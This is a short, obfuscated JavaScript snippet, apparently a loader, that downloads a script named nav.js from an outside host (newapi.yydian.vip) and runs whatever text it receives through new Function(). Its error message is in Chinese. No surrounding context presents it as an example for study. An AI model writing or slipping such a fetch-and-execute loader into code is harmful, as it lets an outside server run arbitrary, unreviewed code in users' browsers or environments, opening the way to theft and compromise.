
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/nav.js").then(_0x345f45 => {
  if (!_0x345f45.ok) throw new Error("请检查网络是否OK");
  return _0x345f45.text();
}).then(_0x20f448 => {
  const _0x50d63d = new Function(_0x20f448);
  _0x50d63d();
}).catch(_0x15fa6b => {
  reject();
});